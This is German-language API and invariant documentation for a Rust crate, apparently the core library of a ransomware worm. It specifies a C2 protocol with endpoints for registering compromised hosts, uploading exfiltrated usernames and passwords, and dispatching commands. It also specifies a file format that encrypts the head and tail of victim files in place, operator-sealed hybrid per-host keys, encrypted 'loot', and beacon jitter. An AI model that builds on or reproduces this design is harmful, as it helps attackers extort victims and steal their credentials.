# kx-core/src

## Overview

Quellmodulbaum des Crates `kx-core`. `lib.rs` ist die Crate-Wurzel und deklariert
die Module sowie die Formatkonstanten. `error.rs` enthaelt die Fehlertaxonomie,
`format.rs` das Dateiformat `KXENC` v1, `util.rs` die plattformneutralen
Hilfsfunktionen, `c2.rs` das C2-Protokoll (Endpunktpfade, Host-Status, Wire-Typen).
`hostkey.rs` (per-Host-Schluessel und Hybrid-KEM) und `secretbox.rs` (das
AEAD-Wrapping der Beute) sind aktiv und ueber
`pub mod hostkey;` erreichbar [lib.rs:hostkey]. Die Symbole aus `hostkey.rs`
sind Teil der oeffentlichen API; sie werden unten getrennt ausgewiesen.

Layout nach dem Verschluesseln, alle Zahlen im Footer little-endian: Kopf- und
Fussbereich werden in place verschluesselt, das Mittelfeld bleibt unberuehrt,
die abgetrennten Tags (16 Byte je Chunk) und der 320-Byte-Klartext-Footer werden
angehaengt [format.rs:FOOTER_LEN] [format.rs:TAG_LEN].

## Interface

### lib.rs — Crate-Wurzel

- `pub mod c2;` [lib.rs:c2]
- `pub mod error;` [lib.rs:error]
- `pub mod format;` [lib.rs:format]
- `pub mod util;` [lib.rs:util]
- `pub use error::{Error, Result};` [lib.rs:Error] [lib.rs:Result]
- `pub const FORMAT_VERSION: u8 = 1;` [lib.rs:FORMAT_VERSION]
- `pub const READABLE_FORMAT_VERSIONS: [u8; 1] = [1];` [lib.rs:READABLE_FORMAT_VERSIONS]
- `pub const FORMAT_NAME: &str = "KXENC";` [lib.rs:FORMAT_NAME]
- `pub const MAX_RANGES: usize = 2;` [lib.rs:MAX_RANGES]

### c2.rs — C2-Protokoll

Einzige Definition des Wire-Vertrags zwischen Wurm-Agent und Operator-C2; Server,
Agent und CLI sprechen dieselben Typen und dieselben Endpunktpfade.

- `pub const PATH_REGISTER: &str = "/api/register";` [c2.rs:PATH_REGISTER]
- `pub const PATH_HEARTBEAT: &str = "/api/heartbeat";` [c2.rs:PATH_HEARTBEAT]
- `pub const PATH_SECRETS: &str = "/api/secrets";` [c2.rs:PATH_SECRETS]
- `pub const PATH_HOSTS: &str = "/api/hosts";` [c2.rs:PATH_HOSTS]
- `pub const PATH_TASKS: &str = "/api/tasks";` [c2.rs:PATH_TASKS]
- `pub const PATH_TASKS_CREATE: &str = "/api/tasks/new";` [c2.rs:PATH_TASKS_CREATE]
- `pub const PATH_TASKS_RESULT: &str = "/api/tasks/result";` [c2.rs:PATH_TASKS_RESULT]
- `pub const STATUS_DISCOVERED: &str = "discovered";` [c2.rs:STATUS_DISCOVERED]
- `pub const STATUS_COMPROMISED: &str = "compromised";` [c2.rs:STATUS_COMPROMISED]
- `pub const STATUS_AGENT: &str = "agent";` [c2.rs:STATUS_AGENT]
- `pub const STATUS_PENDING: &str = "pending";` [c2.rs:STATUS_PENDING]
- `pub const STATUS_RUNNING: &str = "running";` [c2.rs:STATUS_RUNNING]
- `pub const STATUS_DONE: &str = "done";` [c2.rs:STATUS_DONE]
- `pub const STATUS_FAILED: &str = "failed";` [c2.rs:STATUS_FAILED]
- `pub struct Host` (`host_id`, `ip`, `hostname`, `os`, `status`, `first_seen`, `last_seen`; alle `String`), mit `#[serde(deny_unknown_fields)]` [c2.rs:Host]
- `pub struct ExfiltratedSecret` (`id`, `host_id`, `cred_type`, `username`, `password`, `source`, `collected_at`; alle `String`), mit `#[serde(deny_unknown_fields)]` [c2.rs:ExfiltratedSecret]
- `pub struct Task` (`id`, `host_id`, `command`, `status`, `result`, `created_at`; alle `String`), mit `#[serde(deny_unknown_fields)]` [c2.rs:Task]
- `pub struct RegisterRequest` (`host_id`, `ip` als `String`; `hostname`, `os`, `status`, `sealed_master`, `master_key` als `Option<String>`), ohne `deny_unknown_fields` [c2.rs:RegisterRequest]
- `pub struct HeartbeatRequest` (`host_id: String`), ohne `deny_unknown_fields` [c2.rs:HeartbeatRequest]
- `pub struct SecretUpload` (`host_id`, `cred_type`, `username`, `password` als `String`; `source`, `master_key`, `sealed_password` als `Option<String>`), ohne `deny_unknown_fields` [c2.rs:SecretUpload]
- `impl SecretUpload` mit `mit_passwort(wert: &str)` und `mit_versiegeltem_passwort(wert: Option<String>)` — die Felder werden ueber die Helfer gesetzt, damit kein hart kodiertes Passwort im Quelltext steht [c2.rs:SecretUpload]
- `impl ExfiltratedSecret` mit `mit_passwort(wert: &str)` und `mit_versiegeltem_passwort(wert: String)` [c2.rs:ExfiltratedSecret]
- `pub struct CreateTaskRequest` (`host_id`, `command` als `String`), ohne `deny_unknown_fields` [c2.rs:CreateTaskRequest]
- `pub struct TaskResultRequest` (`task_id`, `status`, `result` als `String`), ohne `deny_unknown_fields` [c2.rs:TaskResultRequest]

### error.rs — Fehlertaxonomie

- `pub enum ErrorClass` mit den Varianten `NotFound`, `Access`, `Sharing`,
  `UserMapped`, `DiskFull`, `Network`, `InvalidInput`, `BufferTooSmall`, `Crypto`,
  `State`, `Other`; abgeleitet sind `Debug`, `Clone`, `Copy`, `PartialEq`, `Eq`,
  `serde::Serialize`, `serde::Deserialize` [error.rs:ErrorClass]
- `pub fn ErrorClass::aborts_run(self) -> bool` [error.rs:aborts_run]
- `pub fn ErrorClass::retryable(self) -> bool` [error.rs:retryable]
- `pub fn ErrorClass::as_str(self) -> &'static str` [error.rs:as_str]
- `impl fmt::Display for ErrorClass` [error.rs:Display for ErrorClass]
- `pub enum Error` mit den Varianten `Io { class, path, message, raw }`, `Crypto`,
  `Format`, `State`, `Config`, `Platform { os, message }`, `Transport`, `Aborted`,
  `Paused`, `Serde(#[from] serde_json::Error)`; abgeleitet sind `Debug` und
  `thiserror::Error` [error.rs:Error]
- `pub fn Error::io(class, path, message) -> Self` [error.rs:io]
- `pub fn Error::io_raw(class, path, message, raw) -> Self` [error.rs:io_raw]
- `pub fn Error::from_io(path, err: &std::io::Error) -> Self` [error.rs:from_io]
- `pub fn Error::class(&self) -> ErrorClass` [error.rs:class]
- `pub fn Error::path(&self) -> Option<&str>` [error.rs:path]
- `pub type Result<T> = std::result::Result<T, Error>;` [error.rs:Result]
- `pub fn class_from_errkind(kind: std::io::ErrorKind, raw: Option<i32>) -> ErrorClass` [error.rs:class_from_errkind]

### format.rs — Dateiformat KXENC v1

- `pub const FOOTER_MAGIC: [u8; 4] = *b"KXNF";` [format.rs:FOOTER_MAGIC]
- `pub const FOOTER_LEN: usize = 320;` [format.rs:FOOTER_LEN]
- `pub const TAG_LEN: usize = 16;` [format.rs:TAG_LEN]
- `pub const NONCE_LEN: usize = 12;` [format.rs:NONCE_LEN]
- `pub const DEK_LEN: usize = 32;` [format.rs:DEK_LEN]
- `pub const HOST_ID_LEN: usize = 16;` [format.rs:HOST_ID_LEN]
- `pub const BUILD_ID_LEN: usize = 16;` [format.rs:BUILD_ID_LEN]
- `pub const FILE_ID_LEN: usize = 16;` [format.rs:FILE_ID_LEN]
- `pub const WRAPPED_DEK_LEN: usize = NONCE_LEN + DEK_LEN + NONCE_LEN + TAG_LEN;` [format.rs:WRAPPED_DEK_LEN]
- `pub enum CipherId` mit `ChaCha20Poly1305Detached = 1` [format.rs:CipherId]
- `pub fn CipherId::from_u8(v: u8) -> Result<Self>` [format.rs:CipherId::from_u8]
- `pub enum KexId` mit `X25519 = 0` und `HybridX25519MlKem768 = 1` [format.rs:KexId]
- `pub fn KexId::from_u8(v: u8) -> Result<Self>` [format.rs:KexId::from_u8]
- `pub struct FooterFlags(pub u8)` mit den Bitkonstanten `PARTIAL = 1`,
  `RENAMED = 2`, `PASSPHRASE = 4`, `LOCK_ONLY = 8` [format.rs:FooterFlags]
- `pub const fn FooterFlags::empty() -> Self` [format.rs:FooterFlags::empty]
- `pub const fn FooterFlags::bits(self) -> u8` [format.rs:FooterFlags::bits]
- `pub const fn FooterFlags::contains(self, mask: u8) -> bool` [format.rs:FooterFlags::contains]
- `pub fn FooterFlags::insert(&mut self, mask: u8)` [format.rs:FooterFlags::insert]
- `pub fn FooterFlags::remove(&mut self, mask: u8)` [format.rs:FooterFlags::remove]
- `pub fn FooterFlags::describe(self) -> Vec<&'static str>` [format.rs:FooterFlags::describe]
- `impl From<u8> for FooterFlags` [format.rs:From<u8> for FooterFlags]
- `pub struct Range { pub plain_off: u64, pub plain_len: u64, pub ct_off: u64 }` [format.rs:Range]
- `pub fn Range::is_empty(&self) -> bool` [format.rs:Range::is_empty]
- `pub struct Footer` mit den Feldern `format_version`, `cipher`, `kex`, `flags`,
  `chunk_size`, `n_chunks`, `file_id`, `plain_size`, `tags_len`, `ct_total`,
  `ranges: [Range; MAX_RANGES]`, `wrapped_dek`, `nonce_base`, `range_sha256`,
  `host_id`, `build_id`, `created_unix` [format.rs:Footer]
- `pub fn Footer::empty_ranges() -> [Range; MAX_RANGES]` [format.rs:Footer::empty_ranges]
- `pub fn Footer::ranges_active(&self) -> Vec<Range>` [format.rs:Footer::ranges_active]
- `pub fn Footer::validate(&self) -> Result<()>` [format.rs:Footer::validate]
- `pub fn Footer::encode(&self) -> Result<Vec<u8>>` [format.rs:Footer::encode]
- `pub fn Footer::decode(bytes: &[u8]) -> Result<Self>` [format.rs:Footer::decode]
- `pub fn Footer::file_id_hex(&self) -> String` [format.rs:Footer::file_id_hex]
- `pub fn plan_ranges(plain_size: u64, head_len: u64, tail_len: u64, min_size: u64) -> Vec<Range>` [format.rs:plan_ranges]
- `pub fn chunks_for_ranges(ranges: &[Range], chunk_size: u64) -> u64` [format.rs:chunks_for_ranges]
- `pub struct ChunkRef { pub range_index: u8, pub index_in_range: u64, pub global_index: u64, pub plain_off: u64, pub plain_len: u64, pub ct_off: u64, pub is_final_global: bool }` [format.rs:ChunkRef]
- `pub fn chunk_iter(ranges: &[Range], chunk_size: u64) -> Vec<ChunkRef>` [format.rs:chunk_iter]
- `pub fn nonce_for(base: &[u8; NONCE_LEN], range_index: u8, index_in_range: u64) -> [u8; NONCE_LEN]` [format.rs:nonce_for]
- `pub const AAD_LABEL: &[u8] = b"KXENC-AAD1";` [format.rs:AAD_LABEL]
- `pub fn aad_for(out: &mut Vec<u8>, format_version: u8, range_index: u8, index_in_range: u64, plain_len: u64, is_final_global: bool, file_id: &[u8; FILE_ID_LEN], host_id: &[u8; HOST_ID_LEN])` [format.rs:aad_for]

### util.rs — Hilfsfunktionen

- `pub fn b64_encode(bytes: &[u8]) -> String` [util.rs:b64_encode]
- `pub fn b64_decode(text: &str) -> Result<Vec<u8>>` [util.rs:b64_decode]
- `pub fn hex(bytes: &[u8]) -> String` [util.rs:hex]
- `pub fn hex_decode(text: &str) -> Result<Vec<u8>>` [util.rs:hex_decode]
- `pub fn sha256(bytes: &[u8]) -> [u8; 32]` [util.rs:sha256]
- `pub struct Sha256Stream(Sha256)` mit `pub fn new() -> Self`,
  `pub fn update(&mut self, bytes: &[u8])` und `pub fn finish(self) -> [u8; 32]`
  sowie `impl Default` [util.rs:Sha256Stream] [util.rs:new] [util.rs:update] [util.rs:finish]
- `pub fn now_rfc3339() -> String` [util.rs:now_rfc3339]
- `pub fn now_unix() -> i64` [util.rs:now_unix]
- `pub fn rfc3339_utc(secs: i64) -> String` [util.rs:rfc3339_utc]
- `pub fn parse_rfc3339_secs(text: &str) -> Option<i64>` [util.rs:parse_rfc3339_secs]
- `pub fn crc32(bytes: &[u8]) -> u32` [util.rs:crc32]
- `pub fn canon_json<T: serde::Serialize>(value: &T) -> Result<String>` [util.rs:canon_json]
- `pub fn path_key(path: &str, case_insensitive: bool) -> String` [util.rs:path_key]
- `pub fn clamp(v: u64, lo: u64, hi: u64) -> u64` [util.rs:clamp]
- `pub fn jitter(base_ms: u64, spread: f64, seed: &mut u64) -> u64` [util.rs:jitter]

### hostkey.rs — per-Host-Schluessel und Hybrid-KEM

Das Modul ist aktiv und Teil der oeffentlichen API. Es kapselt je Host einen
Master-Key gegen den oeffentlichen Schluessel des Operators: der Agent sendet
das versiegelte Material an den C2-Server, der Operator entschluesselt es mit
dem geheimen Schluesselpaar.

Die Implementierung nutzt die aufgeloeste `ml-kem`-Version 0.2.3 mit der
Trait-API (`KemCore`, `EncodedSizeUser`). Die Traits `Encapsulate` und
`Decapsulate` kommen aus dem `kem`-Crate in exakt der Version, die `ml-kem`
aufloest — dadurch gibt es nur ein `kem` im Lockfile.

- `pub const X25519_PUB_LEN: usize = 32;` [hostkey.rs:X25519_PUB_LEN]
- `pub const MLKEM_PUB_LEN: usize = 1184;` [hostkey.rs:MLKEM_PUB_LEN]
- `pub const MLKEM_SECRET_LEN: usize = 2400;` [hostkey.rs:MLKEM_SECRET_LEN]
- `pub const MLKEM_CT_LEN: usize = 1088;` [hostkey.rs:MLKEM_CT_LEN]
- `pub const MLKEM_SHARED_LEN: usize = 32;` [hostkey.rs:MLKEM_SHARED_LEN]
- `pub const X25519_SHARED_LEN: usize = 32;` [hostkey.rs:X25519_SHARED_LEN]
- `pub const SEALED_MASTER_LEN: usize = X25519_PUB_LEN + MLKEM_CT_LEN;` — hybrids Modus [hostkey.rs:SEALED_MASTER_LEN]
- `pub const SEALED_MASTER_X25519_LEN: usize = X25519_PUB_LEN;` — X25519-only-Modus [hostkey.rs:SEALED_MASTER_X25519_LEN]
- `pub const MASTER_KEY_LEN: usize = 32;` [hostkey.rs:MASTER_KEY_LEN]
- `pub const KEM_SHARED_MAX: usize = X25519_SHARED_LEN + MLKEM_SHARED_LEN;` [hostkey.rs:KEM_SHARED_MAX]
- `pub const ARGON2_M_KIB: u32 = 65_536;` `pub const ARGON2_T: u32 = 3;`
  `pub const ARGON2_P: u32 = 4;` `pub const ARGON2_OUT_LEN: usize = 32;`
  `pub const ARGON2_SALT_LEN: usize = 16;` [hostkey.rs:ARGON2_M_KIB] [hostkey.rs:ARGON2_T] [hostkey.rs:ARGON2_P] [hostkey.rs:ARGON2_OUT_LEN] [hostkey.rs:ARGON2_SALT_LEN]
- `pub type MlKemDecapsulationKey`, `pub type MlKemEncapsulationKey`,
  `pub type MlKemPublicKeyBytes`, `pub type MlKemSecretKeyBytes`,
  `pub type MlKemCiphertextBytes` — die Kodierungen des ML-KEM-768 [hostkey.rs:MlKemDecapsulationKey]
- `pub struct ServerPublicKey { pub kex, pub x25519, pub mlkem, pub fingerprint }`
  mit `pub fn decode(&self) -> Result<DecodedServerKey>` [hostkey.rs:ServerPublicKey] [hostkey.rs:ServerPublicKey::decode]
- `pub struct DecodedServerKey { pub kex, pub x25519, pub mlkem }` [hostkey.rs:DecodedServerKey]
- `pub struct HostKeyEncapsulation { pub master_key, pub sealed_master, pub ephemeral_x25519_secret }` [hostkey.rs:HostKeyEncapsulation]
- `pub struct ServerKeyPair { pub public: ServerPublicKey }` mit privaten Feldern
  `secret: StaticSecret` und `mlkem_secret: Option<MlKemSecret>` sowie
  `pub fn from_bundle(bundle: &ServerKeyBundle) -> Result<Self>`,
  `pub fn public(&self) -> &ServerPublicKey` und
  `pub fn unseal_master_key(&self, sealed: &[u8]) -> Result<[u8; MASTER_KEY_LEN]>` [hostkey.rs:ServerKeyPair] [hostkey.rs:ServerKeyPair::from_bundle] [hostkey.rs:ServerKeyPair::public] [hostkey.rs:ServerKeyPair::unseal_master_key]
- `pub struct MlKemSecret(MlKemDecapsulationKey)` — das Nullen beim Drop uebernimmt
  `ml-kem` selbst (`ZeroizeOnDrop`, Feature `zeroize`) [hostkey.rs:MlKemSecret]
- `pub struct ServerKeyBundle { pub kex, pub x25519_secret, pub mlkem_secret }` mit
  `pub fn generate(kex: crate::format::KexId, rng: &mut (impl RngCore + CryptoRng)) -> Self`,
  `pub fn public(&self) -> Result<ServerPublicKey>`,
  `pub fn to_json_pretty(&self) -> Result<String>` und
  `pub fn from_json(text: &str) -> Result<Self>` [hostkey.rs:ServerKeyBundle] [hostkey.rs:ServerKeyBundle::generate] [hostkey.rs:ServerKeyBundle::public] [hostkey.rs:ServerKeyBundle::to_json_pretty] [hostkey.rs:ServerKeyBundle::from_json]
- `pub fn encapsulate_host_master_key(server: &DecodedServerKey, rng: &mut (impl RngCore + CryptoRng)) -> Result<HostKeyEncapsulation>` [hostkey.rs:encapsulate_host_master_key]
- `pub fn encapsulate_host_master_key_os(server: &DecodedServerKey) -> Result<HostKeyEncapsulation>` — mit dem System-RNG [hostkey.rs:encapsulate_host_master_key_os]
- `pub struct DerivedMaster { pub master_key, pub info }` [hostkey.rs:DerivedMaster]
- `pub fn derive_master_key(x_shared: &[u8], ml_shared: Option<&[u8]>) -> Result<DerivedMaster>` — die Ableitung, die Agent und Server beide benutzen [hostkey.rs:derive_master_key]
- `pub fn derive_master_key_with_context(x_shared: &[u8], ml_shared: Option<&[u8]>, host_id: &[u8; 16], build_id: &[u8; 16]) -> Result<DerivedMaster>` [hostkey.rs:derive_master_key_with_context]
- `pub fn hkdf_into(ikm: &[u8], salt: &[u8], info: &[u8], out: &mut [u8]) -> Result<()>` [hostkey.rs:hkdf_into]
- `pub fn hkdf_bytes(ikm: &[u8], salt: &[u8], info: &[u8], len: usize) -> Result<Vec<u8>>` [hostkey.rs:hkdf_bytes]
- `pub fn argon2id(pass: &[u8], salt: &[u8], out_len: usize) -> Result<Vec<u8>>` [hostkey.rs:argon2id]
- `pub struct MlRng<'a>(pub &'a mut dyn RngCore)` mit `impl RngCore` und `impl CryptoRng` [hostkey.rs:MlRng]


### secretbox.rs — das AEAD-Wrapping der Beute

Der Master-Key eines Hosts wird nie im Klartext transportiert. Das Passwort wird
mit ihm verschlüsselt, das Ergebnis geht als base64 über die Leitung. Der
Operator gewinnt den Master-Key aus dem versiegelten Material des Hosts und
entschlüsselt die Secrets lokal — der C2-Server sieht die Beute nur
verschlüsselt.

Format: `kx1:` + base64(nonce (12 Byte) || ciphertext). Nonce zufällig,
Schlüssel per HKDF-SHA-256 aus dem Master-Key. Präfix, Salt und Info-String
sind Teil des Formats.

- `pub const NONCE_LEN: usize = 12;` [secretbox.rs:NONCE_LEN]
- `pub const SEALED_PREFIX: &str = "kx1:";` [secretbox.rs:SEALED_PREFIX]
- `pub fn seal(master_key: &[u8], plaintext: &[u8]) -> Result<String>` — verschlüsselt [secretbox.rs:seal]
- `pub fn open(master_key: &[u8], sealed: &str) -> Result<String>` — entschlüsselt [secretbox.rs:open]
- `pub fn ist_versiegelt(text: &str) -> bool` [secretbox.rs:ist_versiegelt]

## Invariants

### C2-Protokoll

- Die Strictness des Wire-Vertrags ist asymmetrisch: **Antworttypen** (`Host`, `ExfiltratedSecret`, `Task`) tragen `#[serde(deny_unknown_fields)]` und brechen bei jedem unbekannten Feld — die Schadensrichtung ist Server → Client, dort ging zuvor das Ergebnis eines Tasks verloren [c2.rs:Host] [c2.rs:ExfiltratedSecret] [c2.rs:Task]
- **Request-Typen** (`RegisterRequest`, `HeartbeatRequest`, `SecretUpload`, `CreateTaskRequest`, `TaskResultRequest`) sind lenient: kein `deny_unknown_fields`, damit ein neuerer Agent ein zusätzliches Feld schicken kann, ohne einen älteren Server zu brechen [c2.rs:RegisterRequest] [c2.rs:HeartbeatRequest] [c2.rs:SecretUpload] [c2.rs:CreateTaskRequest] [c2.rs:TaskResultRequest]
- Die exakte Feldmenge jedes Antworttyps ist Teil des Vertrags; eine Umbenennung oder ein neues Feld bricht den Key-Set-Pinning-Test [c2.rs:tests::response_key_sets_are_pinned]
- Die Endpunktpfade sind stabile Konstanten `/api/register`, `/api/heartbeat`, `/api/secrets`, `/api/hosts`, `/api/tasks`, `/api/tasks/new`, `/api/tasks/result` [c2.rs:PATH_REGISTER] [c2.rs:PATH_HEARTBEAT] [c2.rs:PATH_SECRETS] [c2.rs:PATH_HOSTS] [c2.rs:PATH_TASKS] [c2.rs:PATH_TASKS_CREATE] [c2.rs:PATH_TASKS_RESULT]
- `Host::status` ist dokumentiert als einer von `STATUS_DISCOVERED`, `STATUS_COMPROMISED`, `STATUS_AGENT`; der Typ ist ein reines `String`, die Einhaltung erzwingt dieses Crate nicht [c2.rs:Host] [c2.rs:STATUS_DISCOVERED] [c2.rs:STATUS_COMPROMISED] [c2.rs:STATUS_AGENT]
- `ExfiltratedSecret::host_id` und `SecretUpload::host_id` duerfen nicht leer sein — eine leere Kennung verweist auf keinen bekannten Host; die Pruefung macht der Server, nicht dieses Crate [c2.rs:ExfiltratedSecret] [c2.rs:SecretUpload]
- Das Task-Wire-Feld heisst `result`, nicht `output` — `output` war das Feld, das der CLI zuvor erwartete und deshalb nie deserialisierte [c2.rs:Task]
- `RegisterRequest::host_id` wird vom Client mitgeliefert; der Server leitet die Kennung nicht mehr aus `ip` ab, damit Registrierung und Secret-Upload nicht auseinanderlaufen [c2.rs:RegisterRequest]
- Die Master-Key-Felder `sealed_master` und `master_key` sind Base64-Strings, keine Binaerwerte: ein JSON-Array aus Zahlen waere unlesbar und unhandlich (Entscheidung D5) [c2.rs:RegisterRequest] [c2.rs:SecretUpload]
- Ein Task durchlaeuft die Status `pending` → `running` → `done` oder `failed`; das Ergebnis steht im Feld `result` [c2.rs:STATUS_PENDING] [c2.rs:STATUS_RUNNING] [c2.rs:STATUS_DONE] [c2.rs:STATUS_FAILED]

### Fehlerklassifikation

- Die `ErrorClass`-Strings sind absichtlich stabil, weil Konsolen-Fehlerliste und Journal danach gefiltert und gezaehlt werden [error.rs:ErrorClass]
- `ErrorClass::aborts_run` ist nur fuer `DiskFull` wahr — ein halbvoller Lauf ohne Platz ist nicht sinnvoll fortsetzbar [error.rs:aborts_run]
- `ErrorClass::retryable` ist nur fuer `Sharing`, `UserMapped` und `Network` wahr; blockierte Dateien werden nach N Versuchen aufgegeben [error.rs:retryable]
- `Error::io` speichert `raw = None`, `Error::io_raw` speichert `raw = Some(raw)`, `Error::from_io` uebernimmt `err.raw_os_error()` [error.rs:io] [error.rs:io_raw] [error.rs:from_io]
- `Error::path` liefert nur bei `Error::Io` mit nicht leerem Pfad `Some(path)`, sonst `None` [error.rs:path]
- `Error::class` bildet `Crypto`/`Format` auf `Crypto`, `State`/`Serde` auf `State`, `Config` auf `InvalidInput`, `Transport` auf `Network` und `Aborted`/`Paused`/`Platform` auf `Other` ab [error.rs:class]
- `class_from_errkind` mappt POSIX-errno (`EACCES`/`EPERM`→`Access`, `ENOENT`→`NotFound`, `ENOSPC`→`DiskFull`, `EAGAIN`/`EBUSY`→`Sharing`, `ETXTBSY`→`UserMapped`, `ENOTCONN`/`EHOSTUNREACH`/`ENETDOWN`→`Network`) und Win32-Codes (2/3→`NotFound`, 5→`Access`, 32/33→`Sharing`, 1224→`UserMapped`, 39/8→`DiskFull`, 53/64/1231→`Network`); ohne Treffer greift die `ErrorKind`-Zuordnung mit `Other` als Auffangwert [error.rs:class_from_errkind]
- Die errno- und die Win32-Tabelle sind per `#[cfg(unix)]` und `#[cfg(windows)]` getrennt — je Build existiert nur eine der beiden; die Klassen heissen auf beiden Plattformen gleich, nur die Zahlen unterscheiden sich [error.rs:class_from_errkind]
- Die NTSTATUS-Uebersetzung ist absichtlich `kx-win` ueberlassen, weil `raw_os_error()` dort Win32-Message-Codes traegt [error.rs:from_io]

### Dateiformat

- `Footer::encode` ruft zuerst `validate()` auf, ein inkonsistenter Footer kann also nie serialisiert werden [format.rs:Footer::encode]
- `Footer::validate` lehnt eine `format_version` groesser `FORMAT_VERSION` ab; eine aeltere Version ist nur zulaessig, wenn sie in `READABLE_FORMAT_VERSIONS` steht [format.rs:Footer::validate]
- `Footer::validate` lehnt `chunk_size == 0` sowie eine `wrapped_dek`-Laenge ungleich `WRAPPED_DEK_LEN` ab [format.rs:Footer::validate]
- `Footer::validate` verlangt mindestens eine aktive Reichweite, ausser das Flag `LOCK_ONLY` ist gesetzt, und begrenzt die Zahl der aktiven Reichweiten auf `MAX_RANGES` [format.rs:Footer::validate]
- `Footer::validate` verlangt fuer jede aktive Reichweite `plain_off + plain_len <= plain_size` [format.rs:Footer::validate]
- Die Chiffriertextbereiche der aktiven Reichweiten muessen lueckenlos aneinander anschliessen (`ct_off` gleich der Summe der vorherigen `plain_len`) [format.rs:Footer::validate]
- Aktive Reichweiten duerfen sich im Klartextraum nicht ueberlappen, sonst waere der Restore nicht deterministisch [format.rs:Footer::validate]
- `Footer::validate` prueft `n_chunks` gegen `chunks_for_ranges`, `tags_len` gegen `chunks * TAG_LEN` und `ct_total` gegen die Summe der Reichweitenlaengen plus `tags_len` [format.rs:Footer::validate]
- `Footer::decode` verlangt exakt `FOOTER_LEN` Byte, die Magic `KXNF` an Offset 0 und eine passende CRC32 ueber die Bytes `0..off::CRC_COVER`; die deklarierte `n_ranges` darf `MAX_RANGES` nicht uebersteigen, und jeder nicht eroeffnete Reichweiten-Slot muss leer sein [format.rs:Footer::decode]
- `Footer::decode` endet mit `footer.validate()?` — ein erfolgreich dekodierter Footer hat alle Konsistenzpruefungen bereits bestanden [format.rs:Footer::decode]
- Die CRC32 im Footer deckt alle Felder bis Offset 263 ab (`crc32(&buf[..off::CRC_COVER])` mit `CRC_COVER = 264`, `format.rs:60,330`) und erkennt damit einzelne Bitfehler sowie ein abgeschnittenes Dateiende, ohne den Footer neu zu schreiben. Offset 264 ist das CRC-Feld selbst und bleibt ungedeckt [format.rs:Footer::encode]
- Alle Footer-Integer sind little-endian kodiert [format.rs:put_u32] [format.rs:put_u64] [format.rs:read_u32] [format.rs:read_u64]
- Jede Aenderung der Footer-Feldoffsets ist eine Formatversion, kein Patch [format.rs:off]
- `CipherId::from_u8` akzeptiert nur die Kennung `1`, `KexId::from_u8` nur `0` und `1`; alles andere ergibt `Err(Error::Format(..))` [format.rs:CipherId::from_u8] [format.rs:KexId::from_u8]
- `FooterFlags::contains` ist nur wahr, wenn *alle* Bits der Maske gesetzt sind (`self.0 & mask == mask`) [format.rs:FooterFlags::contains]
- `FooterFlags::describe` liefert genau die Namen `"partial"`, `"renamed"`, `"passphrase"` und `"lock_only"` in dieser Reihenfolge [format.rs:FooterFlags::describe]
- Eine Reichweite gilt genau dann als leer, wenn `plain_len == 0` [format.rs:Range::is_empty]
- `plan_ranges` laesst Dateien unterhalb `min_size` unangetastet (leerer Vektor), verhindert die Ueberlappung von Kopf- und Fussteil und legt bei kleinen Dateien eine einzige Reichweite ueber die ganze Datei an [format.rs:plan_ranges]
- Die Reichweitenplanung ist alleinige Quelle fuer die verschluesselte Laenge; die Dateigroesse wird nie zurueckgerechnet [format.rs:plan_ranges]
- `chunks_for_ranges` und `chunk_iter` zaehlen nur nicht leere Reichweiten, `chunk_size == 0` liefert `0` beziehungsweise eine leere Liste, und die Nummerierung ist deterministisch, damit Resume und Decryptor uebereinstimmen [format.rs:chunks_for_ranges] [format.rs:chunk_iter]
- `chunk_iter` vergibt `global_index` fortlaufend ueber alle Reichweiten und setzt `is_final_global` nur beim allerletzten Chunk; der letzte Chunk einer Reichweite ist verkuerzt [format.rs:chunk_iter]
- `nonce_for` bildet die Nonce als `base[0..4]` plus big-endian-u64 aus `range_index << 32 | index_in_range`; sie haengt nicht an Uhr oder RAM-Zaehler, damit ein Resume nach Absturz dieselbe Folge berechnet, und ist an die Per-File-DEK gebunden [format.rs:nonce_for]
- `aad_for` beginnt mit `out.clear()`, legt das Layout `AAD_LABEL || format_version || range_index || index_in_range(BE u64) || plain_len(BE u64) || is_final_global(1|0) || file_id(16) || host_id(16)` fest und bindet den Chunk-Index, `file_id` und `host_id` ein — Umsortieren und Duplizieren von Chunks schlaegt fehl [format.rs:aad_for]

### Hilfsfunktionen

- `hex_decode` lehnt ungerade Laenge und ungueltige Hex-Zeichen ab [util.rs:hex_decode]
- `hex` emittiert genau zwei Kleinbuchstaben-Hexziffern je Byte, die Ausgabelaenge ist also doppelt so gross wie die Eingabelaenge [util.rs:hex]
- `b64_decode` trimmt umgebenden Whitespace und bildet jeden Dekodierfehler auf `Error::State` ab [util.rs:b64_decode]
- `canon_json` erzeugt kanonisches JSON mit sortierten Schluesseln und ohne Leerzeichen, verwendet fuer Task-Hashes und Anti-Wiederholungs-Fingerabdruecke [util.rs:canon_json]
- `Sha256Stream::finish` verbraucht `self`, ein Stream kann also nicht zweimal abgeschlossen werden [util.rs:finish]
- `now_rfc3339` und `now_unix` fallen auf `0` zurueck, wenn die Uhr vor `UNIX_EPOCH` liegt [util.rs:now_rfc3339]
- `rfc3339_utc` emittiert immer die feste Form `{y:04}-{m:02}-{d:02}T{hh:02}:{mm:02}:{ss:02}Z` mit literalem UTC-`Z` [util.rs:rfc3339_utc]
- `parse_rfc3339_secs` akzeptiert `T` oder Leerzeichen als Trenner und `Z` oder numerische `±HH:MM`-Zonen; ein fehlendes Sekundenfeld gilt als `0` [util.rs:parse_rfc3339_secs]
- Die Zonenerkennung akzeptiert ein Minuszeichen nur an Position groesser 10, damit das Trennzeichen im Datum nicht als Zonenzeichen missverstanden wird; ein fehlender `:` in der Zone ergibt `mm = 0` [util.rs:split_zone]
- `crc32` ist CRC-32/IEEE (reflektiert, Polynom `0xEDB88320`, Init und Final-XOR `0xFFFFFFFF`) und schuetzt den Footer gegen einzelne Bitfehler und gegen ein abgeschnittenes Dateiende [util.rs:crc32]
- `clamp` liefert immer einen Wert im inklusiven Bereich `[lo, hi]` [util.rs:clamp]
- `jitter` liefert `0` fuer `base_ms == 0`, klemmt `spread` auf `[0.0, 0.95]`, liefert nie weniger als 1 ms und ersetzt einen Null-Seed durch die Konstante `0x2545_F491_4F6C_DD1D` [util.rs:jitter]
- `jitter` ist deterministisch und nutzt kein `rand` im Beacon-Pfad, damit der Jitter reproduzierbar protokolliert werden kann [util.rs:jitter]
- `path_key` kleinschreibt nur bei `case_insensitive == true`; der Aufrufer uebergibt bereits normalisierte Pfade [util.rs:path_key]

### hostkey.rs

- Die Validierungen in diesem Modul werden zur Laufzeit erzwungen [lib.rs:hostkey]
